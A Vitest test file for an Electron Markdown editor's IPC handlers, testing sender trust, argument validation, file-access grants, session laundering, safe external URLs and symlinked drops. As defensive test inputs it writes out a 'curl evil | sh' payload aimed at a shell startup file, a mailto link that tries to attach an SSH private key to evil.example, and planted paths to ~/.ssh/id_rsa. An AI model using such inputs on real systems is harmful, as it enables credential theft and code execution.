import { mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { IpcChannel } from '../shared/ipc';
import { unwrapIpcResult } from '../shared/ipc-result';
import { DEFAULT_SETTINGS } from '../shared/settings';
import type { FileReadResult } from '../shared/types';
import type { IpcDependencies } from './ipc';
import { FileService } from './services/fileService';
import { PathRegistry } from './services/pathRegistry';
import { SessionStore } from './services/sessionStore';

type Handler = (event: unknown, ...args: unknown[]) => Promise<unknown>;
type SyncListener = (event: { senderFrame: unknown; returnValue?: unknown }, ...args: unknown[]) => void;

const mocks = vi.hoisted(() => ({
  handlers: new Map<string, Handler>(),
  listeners: new Map<string, SyncListener>(),
  shell: { showItemInFolder: vi.fn(), openExternal: vi.fn(() => Promise.resolve()) },
  fromWebContents: vi.fn(() => null),
  dialogs: {
    confirmReload: vi.fn(),
    confirmUnsaved: vi.fn(),
    showOpenMarkdownDialog: vi.fn(),
    showSaveMarkdownDialog: vi.fn(),
  },
  exporter: { exportHtml: vi.fn(), exportPdf: vi.fn(), exportImage: vi.fn() },
  windows: new Map<number, unknown>(),
}));

vi.mock('electron', () => ({
  ipcMain: {
    handle: (channel: string, handler: Handler) => mocks.handlers.set(channel, handler),
    on: (channel: string, listener: SyncListener) => mocks.listeners.set(channel, listener),
  },
  shell: mocks.shell,
  BrowserWindow: { fromWebContents: mocks.fromWebContents },
}));
vi.mock('./dialogs', () => mocks.dialogs);
vi.mock('./services/exporter', () => mocks.exporter);
vi.mock('./window', () => ({ AppWindow: { fromWebContentsId: (id: number) => mocks.windows.get(id) } }));

const {
  grantDroppedFile,
  HANDLED_CHANNELS,
  IpcValidationError,
  isTrustedSender,
  registerIpcHandlers,
  SYNC_CHANNELS,
} = await import('./ipc');

const readResult = (path: string): FileReadResult => ({
  path,
  content: '#',
  lineEnding: 'lf',
  hasBom: false,
  mtimeMs: 1,
});

function fakeWindow() {
  return {
    browserWindow: { id: 'bw' },
    setTitle: vi.fn(),
    setDirty: vi.fn(),
    acknowledgeCloseRequest: vi.fn(),
    cancelClose: vi.fn(),
    confirmClose: vi.fn(),
    markRendererReady: vi.fn(),
  };
}

function eventFrom(url: string, senderId = 1, parent: unknown = null) {
  return { sender: { id: senderId }, senderFrame: { url, parent } };
}

const appEvent = eventFrom('mpp-app://bundle/index.html');

function setup() {
  const registry = new PathRegistry();
  const deps = {
    registry,
    files: {
      read: vi.fn((path: string) => Promise.resolve(readResult(path))),
      save: vi.fn(),
      saveAs: vi.fn(),
    },
    settings: { get: vi.fn(() => DEFAULT_SETTINGS), set: vi.fn(), reset: vi.fn() },
    recent: { add: vi.fn(() => Promise.resolve([])), get: vi.fn(), clear: vi.fn() },
    session: {
      save: vi.fn(),
      load: vi.fn(),
      isRestorable: vi.fn<(path: string) => boolean>(() => false),
    },
    watcher: { watch: vi.fn(), unwatch: vi.fn() },
    appInfo: {
      name: 'MarkDown++',
      version: '1.0.0',
      platform: 'darwin',
      electron: '44',
      chrome: '1',
      node: '22',
      isPortable: false,
    },
    devServerUrl: 'http://localhost:5183/',
    takePendingFiles: vi.fn(() => Promise.resolve([readResult('/pending.md')])),
  };
  registerIpcHandlers(deps as unknown as IpcDependencies);
  /** The raw envelope a channel resolves with. */
  const raw = (channel: string, ...args: unknown[]): Promise<unknown> => {
    const handler = mocks.handlers.get(channel);
    if (!handler) throw new Error(`no handler for ${channel}`);
    return handler(appEvent, ...args);
  };
  /** Like the preload: the value, or a rejection with the failure's message. */
  const invoke = async (channel: string, ...args: unknown[]): Promise<unknown> =>
    unwrapIpcResult(await raw(channel, ...args));
  return { deps, registry, invoke, raw };
}

let dir: string;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'mpp-ipc-'));
  mocks.handlers.clear();
  mocks.listeners.clear();
  mocks.windows.clear();
  vi.clearAllMocks();
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

describe('isTrustedSender', () => {
  it('accepts top-level app frames only', () => {
    expect(isTrustedSender(appEvent as never, null)).toBe(true);
    expect(isTrustedSender(eventFrom('http://localhost:5183/') as never, 'http://localhost:5183')).toBe(true);
    expect(isTrustedSender(eventFrom('http://localhost:5183/') as never, null)).toBe(false);
    expect(isTrustedSender(eventFrom('https://evil.example') as never, null)).toBe(false);
    expect(isTrustedSender(eventFrom('mpp-app://bundle/index.html', 1, {}) as never, null)).toBe(false);
    expect(isTrustedSender({ sender: { id: 1 }, senderFrame: null } as never, null)).toBe(false);
  });
});

describe('registerIpcHandlers', () => {
  it('handles every renderer to main channel', () => {
    setup();
    const invokeChannels = Object.values(IpcChannel).filter(
      (channel) =>
        ![
          IpcChannel.MenuCommand,
          IpcChannel.OpenFiles,
          IpcChannel.FileChangedOnDisk,
          IpcChannel.CloseRequested,
          IpcChannel.SettingsChanged,
        ].includes(channel as never) && !SYNC_CHANNELS.includes(channel),
    );
    expect([...mocks.handlers.keys()].sort()).toEqual([...invokeChannels].sort());
    expect([...HANDLED_CHANNELS].sort()).toEqual([...invokeChannels].sort());
    expect([...mocks.listeners.keys()]).toEqual([...SYNC_CHANNELS]);
  });

  it('rejects untrusted senders and reports invalid arguments as failures', async () => {
    const { deps, raw } = setup();
    const handler = mocks.handlers.get(IpcChannel.FileRead);
    await expect(handler?.(eventFrom('https://evil.example'), '/a.md')).rejects.toBeInstanceOf(
      IpcValidationError,
    );
    const invalid = { ok: false, code: 'invalid-argument' };
    expect(await raw(IpcChannel.FileRead, 'relative.md')).toMatchObject({
      ...invalid,
      message: expect.stringMatching(/Invalid arguments for file:read/) as unknown,
    });
    expect(await raw(IpcChannel.FileRead, '/a\0.md')).toMatchObject({
      ...invalid,
      message: expect.stringMatching(/NUL/) as unknown,
    });
    expect(await raw(IpcChannel.FileRead, '/a.md', 'extra')).toMatchObject(invalid);
    expect(await raw(IpcChannel.FileRead)).toMatchObject(invalid);
    expect(deps.files.read).not.toHaveBeenCalled();
  });

  it('resolves expected failures with their code instead of rejecting', async () => {
    const { deps, raw } = setup();
    const enoent = Object.assign(new Error("ENOENT: no such file or directory, stat '/gone.md'"), {
      code: 'ENOENT',
      path: '/gone.md',
    });
    deps.files.read.mockRejectedValueOnce(enoent);
    expect(await raw(IpcChannel.FileRead, '/gone.md')).toEqual({
      ok: false,
      code: 'not-found',
      message: '"/gone.md" does not exist. It may have been moved, renamed or deleted.',
    });
    expect(await raw(IpcChannel.FileWatch, '/a.md')).toEqual({
      ok: false,
      code: 'not-allowed',
      message: 'Access to "/a.md" was not granted.',
    });
    expect(await raw(IpcChannel.AppInfo)).toEqual({ ok: true, value: deps.appInfo });
    expect(await raw(IpcChannel.SettingsReset)).toEqual({ ok: true, value: undefined });
  });

  it('logs unexpected errors and reports them as internal failures', async () => {
    const { deps, raw } = setup();
    const error = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    try {
      deps.settings.reset.mockImplementationOnce(() => {
        throw new TypeError('bug');
      });
      expect(await raw(IpcChannel.SettingsReset)).toEqual({ ok: false, code: 'internal', message: 'bug' });
      expect(error).toHaveBeenCalledTimes(1);
    } finally {
      error.mockRestore();
    }
  });

  describe('files', () => {
    it('opens files chosen in the dialog, granting and remembering them', async () => {
      const { deps, registry, invoke } = setup();
      mocks.dialogs.showOpenMarkdownDialog.mockResolvedValue(['/a.md', '/b.bin']);
      deps.files.read.mockImplementation((path: string) =>
        path === '/b.bin' ? Promise.reject(new Error('binary')) : Promise.resolve(readResult(path)),
      );
      expect(await invoke(IpcChannel.FileOpenDialog)).toEqual([readResult('/a.md')]);
      expect(registry.has('/b.bin')).toBe(true);
      expect(deps.recent.add).toHaveBeenCalledWith('/a.md');
      expect(mocks.dialogs.showOpenMarkdownDialog).toHaveBeenCalledWith(null);
    });

    it('reports the failure when no chosen file could be opened', async () => {
      const { deps, invoke } = setup();
      mocks.dialogs.showOpenMarkdownDialog.mockResolvedValue(['/x.md', '/y.md']);
      deps.files.read.mockRejectedValueOnce(new Error('first')).mockRejectedValueOnce('second');
      await expect(invoke(IpcChannel.FileOpenDialog)).rejects.toThrow('first');
      mocks.dialogs.showOpenMarkdownDialog.mockResolvedValue(['/z.md']);
      deps.files.read.mockRejectedValueOnce('plain');
      await expect(invoke(IpcChannel.FileOpenDialog)).rejects.toThrow('plain');
      mocks.dialogs.showOpenMarkdownDialog.mockResolvedValue([]);
      expect(await invoke(IpcChannel.FileOpenDialog)).toEqual([]);
    });

    it('reads and remembers files', async () => {
      const { deps, invoke } = setup();
      expect(await invoke(IpcChannel.FileRead, '/a.md')).toEqual(readResult('/a.md'));
      expect(deps.recent.add).toHaveBeenCalledWith('/a.md');
    });

    it('saves and saves as', async () => {
      const { deps, invoke } = setup();
      const request = { path: '/a.md', content: 'x', lineEnding: 'crlf', hasBom: true };
      deps.files.save.mockResolvedValue({ path: '/a.md', mtimeMs: 5 });
      expect(await invoke(IpcChannel.FileSave, request)).toEqual({ path: '/a.md', mtimeMs: 5 });
      await expect(invoke(IpcChannel.FileSave, { ...request, lineEnding: 'cr' })).rejects.toThrow(/Invalid/);

      const saveAs = { suggestedName: 'Untitled', content: 'x', lineEnding: 'lf', hasBom: false };
      mocks.dialogs.showSaveMarkdownDialog.mockResolvedValueOnce(null);
      expect(await invoke(IpcChannel.FileSaveAsDialog, saveAs)).toBeNull();
      mocks.dialogs.showSaveMarkdownDialog.mockResolvedValueOnce('/new.md');
      deps.files.saveAs.mockResolvedValue({ path: '/new.md', mtimeMs: 9 });
      expect(await invoke(IpcChannel.FileSaveAsDialog, saveAs)).toEqual({ path: '/new.md', mtimeMs: 9 });
      expect(deps.files.saveAs).toHaveBeenCalledWith('/new.md', {
        content: 'x',
        lineEnding: 'lf',
        hasBom: false,
      });
      expect(deps.recent.add).toHaveBeenCalledWith('/new.md');
      expect(mocks.dialogs.showSaveMarkdownDialog).toHaveBeenCalledWith(null, 'Untitled', null);
    });

    it('starts Save As in the folder of a granted document only', async () => {
      const { registry, invoke } = setup();
      mocks.dialogs.showSaveMarkdownDialog.mockResolvedValue(null);
      const request = { suggestedName: 'spec', content: 'x', lineEnding: 'lf', hasBom: false };
      await invoke(IpcChannel.FileSaveAsDialog, { ...request, documentPath: '/work/docs/spec.md' });
      expect(mocks.dialogs.showSaveMarkdownDialog).toHaveBeenLastCalledWith(null, 'spec', null);
      registry.add('/work/docs/spec.md');
      await invoke(IpcChannel.FileSaveAsDialog, { ...request, documentPath: '/work/docs/spec.md' });
      expect(mocks.dialogs.showSaveMarkdownDialog).toHaveBeenLastCalledWith(null, 'spec', '/work/docs');
      await invoke(IpcChannel.FileSaveAsDialog, { ...request, documentPath: null });
      expect(mocks.dialogs.showSaveMarkdownDialog).toHaveBeenLastCalledWith(null, 'spec', null);
      await expect(
        invoke(IpcChannel.FileSaveAsDialog, { ...request, documentPath: 'relative.md' }),
      ).rejects.toThrow(/Invalid arguments/);
    });

    it('never fails an open or a Save As because the recent list could not be updated', async () => {
      const { deps, registry, invoke } = setup();
      const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
      try {
        deps.recent.add.mockRejectedValue(Object.assign(new Error('EROFS'), { code: 'EROFS' }));
        registry.add('/a.md');
        expect(await invoke(IpcChannel.FileRead, '/a.md')).toEqual(readResult('/a.md'));
        mocks.dialogs.showOpenMarkdownDialog.mockResolvedValue(['/b.md']);
        expect(await invoke(IpcChannel.FileOpenDialog)).toEqual([readResult('/b.md')]);
        mocks.dialogs.showSaveMarkdownDialog.mockResolvedValueOnce('/new.md');
        deps.files.saveAs.mockResolvedValue({ path: '/new.md', mtimeMs: 9 });
        const saveAs = { suggestedName: 'Untitled', content: 'x', lineEnding: 'lf', hasBom: false };
        expect(await invoke(IpcChannel.FileSaveAsDialog, saveAs)).toEqual({ path: '/new.md', mtimeMs: 9 });
        expect(warn).toHaveBeenCalledTimes(3);
      } finally {
        warn.mockRestore();
      }
    });

    it('exports through the exporter with the window as dialog parent', async () => {
      const { invoke } = setup();
      const window = fakeWindow();
      mocks.windows.set(1, window);
      mocks.exporter.exportHtml.mockResolvedValue('/out.html');
      mocks.exporter.exportPdf.mockResolvedValue(null);
      const request = { suggestedName: 'Doc', html: '<p/>' };
      expect(await invoke(IpcChannel.FileExportHtml, request)).toBe('/out.html');
      expect(await invoke(IpcChannel.FileExportPdf, request)).toBeNull();
      expect(mocks.exporter.exportHtml).toHaveBeenCalledWith(
        window.browserWindow,
        request,
        expect.objectContaining({ directory: null }),
      );
      mocks.exporter.exportImage.mockResolvedValue('/out.png');
      const image = { ...request, width: 892 };
      expect(await invoke(IpcChannel.FileExportImage, image)).toBe('/out.png');
      expect(mocks.exporter.exportImage).toHaveBeenCalledWith(
        window.browserWindow,
        image,
        expect.objectContaining({ directory: null }),
      );
    });

    it('rejects image exports without a sane page width', async () => {
      const { invoke } = setup();
      const request = { suggestedName: 'Doc', html: '<p/>' };
      for (const width of [undefined, 0, 319, 4001, 892.5, '892']) {
        await expect(invoke(IpcChannel.FileExportImage, { ...request, width })).rejects.toThrow();
      }
      expect(mocks.exporter.exportImage).not.toHaveBeenCalled();
    });

    it('exports next to a granted document and embeds network images only from its server', async () => {
      const { registry, invoke } = setup();
      mocks.exporter.exportPdf.mockResolvedValue(null);
      registry.add('/work/spec.md');
      await invoke(IpcChannel.FileExportPdf, {
        suggestedName: 'spec',
        html: '',
        documentPath: '/work/spec.md',
      });
      const options = mocks.exporter.exportPdf.mock.calls[0]?.[2] as {
        directory: string | null;
        imagePolicy: { allowUncHost: (host: string) => boolean };
      };
      expect(options.directory).toBe('/work');
      expect(options.imagePolicy.allowUncHost('fileserver')).toBe(false);
    });

    it('watches only granted files and reveals only granted files', async () => {
      const { deps, registry, invoke } = setup();
      await expect(invoke(IpcChannel.FileWatch, '/a.md')).rejects.toThrow(/not granted/);
      await expect(invoke(IpcChannel.FileRevealInFolder, '/a.md')).rejects.toThrow(/not granted/);
      registry.add('/a.md');
      await invoke(IpcChannel.FileWatch, '/a.md');
      expect(deps.watcher.watch).toHaveBeenCalledWith(1, '/a.md');
      await invoke(IpcChannel.FileUnwatch, '/a.md');
      expect(deps.watcher.unwatch).toHaveBeenCalledWith(1, '/a.md');
      await invoke(IpcChannel.FileRevealInFolder, '/a.md');
      expect(mocks.shell.showItemInFolder).toHaveBeenCalledWith('/a.md');
    });
  });

  describe('settings, recent files and session', () => {
    it('delegates settings', async () => {
      const { deps, invoke } = setup();
      expect(await invoke(IpcChannel.SettingsGet)).toBe(DEFAULT_SETTINGS);
      await invoke(IpcChannel.SettingsSet, { editor: { tabSize: 4 } });
      expect(deps.settings.set).toHaveBeenCalledWith({ editor: { tabSize: 4 } });
      await expect(invoke(IpcChannel.SettingsSet, { version: 2 })).rejects.toThrow(/Invalid/);
      await expect(invoke(IpcChannel.SettingsSet, { editor: 'x' })).rejects.toThrow(/Invalid/);
      await invoke(IpcChannel.SettingsReset);
      expect(deps.settings.reset).toHaveBeenCalled();
    });

    it('grants recent files', async () => {
      const { deps, registry, invoke } = setup();
      deps.recent.get.mockResolvedValue([{ path: '/r.yaml', openedAt: 1 }]);
      expect(await invoke(IpcChannel.RecentGet)).toEqual([{ path: '/r.yaml', openedAt: 1 }]);
      expect(registry.has('/r.yaml')).toBe(true);
      await invoke(IpcChannel.RecentClear);
      expect(deps.recent.clear).toHaveBeenCalled();
    });

    it('grants the documents of the session found at startup', async () => {
      const { deps, registry, invoke } = setup();
      const state = { documents: [{ path: '/s.conf', mode: 'source' }], activePath: '/s.conf' };
      deps.session.isRestorable.mockImplementation((path) => path === '/s.conf');
      deps.session.load.mockResolvedValueOnce(state).mockResolvedValueOnce(null);
      expect(await invoke(IpcChannel.SessionLoad)).toEqual(state);
      expect(registry.has('/s.conf')).toBe(true);
      expect(await invoke(IpcChannel.SessionLoad)).toBeNull();
    });

    it('never lets the renderer grant itself files through the session (save, then load)', async () => {
      const { deps, registry, invoke } = setup();
      registry.add('/granted.md');
      const planted = {
        documents: [
          { path: '/granted.md', mode: 'wysiwyg' },
          { path: '/home/u/.zshrc', mode: 'source' },
          { path: '/home/u/.ssh/id_rsa', mode: 'source' },
        ],
        activePath: '/home/u/.ssh/id_rsa',
      };
      await invoke(IpcChannel.SessionSave, planted);
      // Only granted documents are written, and the active path must be one of them.
      expect(deps.session.save).toHaveBeenCalledWith({
        documents: [{ path: '/granted.md', mode: 'wysiwyg' }],
        activePath: null,
      });
      // Even if the file itself contains the paths (e.g. an older version wrote them),
      // loading grants only granted or startup-restorable documents.
      deps.session.load.mockResolvedValueOnce(planted);
      expect(await invoke(IpcChannel.SessionLoad)).toEqual({
        documents: [{ path: '/granted.md', mode: 'wysiwyg' }],
        activePath: null,
      });
      expect(registry.has('/home/u/.zshrc')).toBe(false);
      expect(registry.has('/home/u/.ssh/id_rsa')).toBe(false);
    });

    it('blocks the session laundering exploit end to end with the real services', async () => {
      const victim = join(dir, 'zshrc');
      await writeFile(victim, 'original');
      const registry = new PathRegistry();
      const session = new SessionStore(join(dir, 'session.json'));
      await session.captureStartupSession();
      const deps = {
        ...setup().deps,
        registry,
        files: new FileService(registry),
        session,
      };
      mocks.handlers.clear();
      registerIpcHandlers(deps as unknown as IpcDependencies);
      const call = async (channel: string, ...args: unknown[]): Promise<unknown> =>
        unwrapIpcResult(await mocks.handlers.get(channel)?.(appEvent, ...args));

      await call(IpcChannel.SessionSave, {
        documents: [{ path: victim, mode: 'source' }],
        activePath: victim,
      });
      expect(await call(IpcChannel.SessionLoad)).toEqual({ documents: [], activePath: null });
      await expect(call(IpcChannel.FileRead, victim)).rejects.toThrow(/not granted/);
      await expect(
        call(IpcChannel.FileSave, {
          path: victim,
          content: 'curl evil | sh',
          lineEnding: 'lf',
          hasBom: false,
        }),
      ).rejects.toThrow(/not granted/);
      expect(await readFile(victim, 'utf8')).toBe('original');
    });

    it('keeps the active document when it is granted', async () => {
      const { deps, registry, invoke } = setup();
      registry.add('/a.md');
      await invoke(IpcChannel.SessionSave, {
        documents: [{ path: '/a.md', mode: 'source' }],
        activePath: '/a.md',
      });
      expect(deps.session.save).toHaveBeenCalledWith({
        documents: [{ path: '/a.md', mode: 'source' }],
        activePath: '/a.md',
      });
    });
  });

  describe('app and window', () => {
    it('returns app info and opens only safe external URLs', async () => {
      const { deps, invoke } = setup();
      expect(await invoke(IpcChannel.AppInfo)).toBe(deps.appInfo);
      await invoke(IpcChannel.OpenExternal, 'https://example.com');
      expect(mocks.shell.openExternal).toHaveBeenCalledWith('https://example.com');
      await expect(invoke(IpcChannel.OpenExternal, 'file:///etc/passwd')).rejects.toThrow(/Only http/);
      await invoke(IpcChannel.OpenExternal, 'mailto:x@evil.example?attach=/home/u/.ssh/id_rsa&subject=Hi');
      expect(mocks.shell.openExternal).toHaveBeenLastCalledWith('mailto:x@evil.example?subject=Hi');
    });

    it('requires a window for window operations', async () => {
      const { invoke } = setup();
      await expect(invoke(IpcChannel.WindowSetTitle, 'x')).rejects.toThrow(/application window/);
    });

    it('updates title and dirty state', async () => {
      const { invoke } = setup();
      const window = fakeWindow();
      mocks.windows.set(1, window);
      await invoke(IpcChannel.WindowSetTitle, 'a.md');
      await invoke(IpcChannel.WindowSetTitle, 'b.md', '/b.md');
      await invoke(IpcChannel.WindowSetTitle, 'Untitled', null);
      expect(window.setTitle.mock.calls).toEqual([
        ['a.md', null],
        ['b.md', '/b.md'],
        ['Untitled', null],
      ]);
      await expect(invoke(IpcChannel.WindowSetTitle, 'x', 'relative')).rejects.toThrow(/Invalid/);
      await invoke(IpcChannel.WindowSetDirty, true);
      expect(window.setDirty).toHaveBeenCalledWith(true);
    });

    it('confirms unsaved changes, acknowledging a pending close', async () => {
      const { invoke } = setup();
      const window = fakeWindow();
      mocks.windows.set(1, window);
      mocks.dialogs.confirmUnsaved.mockResolvedValueOnce('save');
      expect(await invoke(IpcChannel.ConfirmUnsaved, 'a.md')).toBe('save');
      expect(window.acknowledgeCloseRequest).toHaveBeenCalledTimes(1);
      mocks.dialogs.confirmUnsaved.mockResolvedValueOnce('cancel');
      expect(await invoke(IpcChannel.ConfirmUnsaved, 'a.md')).toBe('cancel');
      expect(window.cancelClose).not.toHaveBeenCalled();
      expect(mocks.dialogs.confirmUnsaved).toHaveBeenCalledWith(window.browserWindow, 'a.md');
    });

    it('cancels a pending close when the renderer aborts the handshake', async () => {
      const { invoke } = setup();
      const window = fakeWindow();
      mocks.windows.set(1, window);
      await invoke(IpcChannel.CloseCancelled);
      expect(window.cancelClose).toHaveBeenCalledTimes(1);
      await expect(invoke(IpcChannel.CloseCancelled, 'extra')).rejects.toThrow(/Invalid/);
    });

    it('confirms reloads, finishes the close handshake and hands out pending files', async () => {
      const { deps, invoke } = setup();
      const window = fakeWindow();
      mocks.windows.set(1, window);
      mocks.dialogs.confirmReload.mockResolvedValue(true);
      expect(await invoke(IpcChannel.ConfirmReload, 'a.md')).toBe(true);
      await invoke(IpcChannel.CloseReady);
      expect(window.confirmClose).toHaveBeenCalled();
      expect(await invoke(IpcChannel.TakePendingFiles)).toEqual([readResult('/pending.md')]);
      expect(window.markRendererReady).toHaveBeenCalled();
      expect(deps.takePendingFiles).toHaveBeenCalled();
    });
  });
});

describe('dropped files', () => {
  function dropEvent(url = 'mpp-app://bundle/index.html') {
    return { senderFrame: { url, parent: null }, returnValue: undefined as unknown };
  }

  it('grants dropped markdown files on the synchronous channel', async () => {
    const { registry } = setup();
    const path = join(dir, 'notes.md');
    await writeFile(path, '# Notes');
    const listener = mocks.listeners.get(IpcChannel.FileGrantDropped);
    const event = dropEvent();
    listener?.(event, path);
    expect(event.returnValue).toBe(true);
    expect(registry.has(path)).toBe(true);
  });

  it('refuses drops reported by untrusted senders', async () => {
    const { registry } = setup();
    const path = join(dir, 'notes.md');
    await writeFile(path, '# Notes');
    const event = dropEvent('https://evil.example/');
    mocks.listeners.get(IpcChannel.FileGrantDropped)?.(event, path);
    expect(event.returnValue).toBe(false);
    expect(registry.has(path)).toBe(false);
  });

  it('grants only existing markdown files, judged by the symlink target', async () => {
    const registry = new PathRegistry();
    const secret = join(dir, 'bashrc');
    await writeFile(secret, 'export X=1');
    const disguised = join(dir, 'notes.md');
    await symlink(secret, disguised);
    const real = join(dir, 'real.md');
    await writeFile(real, '#');
    const linkToMarkdown = join(dir, 'link-without-extension');
    await symlink(real, linkToMarkdown);
    expect(grantDroppedFile(registry, disguised)).toBe(false);
    expect(grantDroppedFile(registry, secret)).toBe(false);
    expect(grantDroppedFile(registry, join(dir, 'missing.md'))).toBe(false);
    expect(grantDroppedFile(registry, dir)).toBe(false);
    expect(grantDroppedFile(registry, 'relative.md')).toBe(false);
    expect(grantDroppedFile(registry, 42)).toBe(false);
    expect(registry.size).toBe(0);
    expect(grantDroppedFile(registry, linkToMarkdown)).toBe(true);
    expect(registry.has(linkToMarkdown)).toBe(true);
  });
});
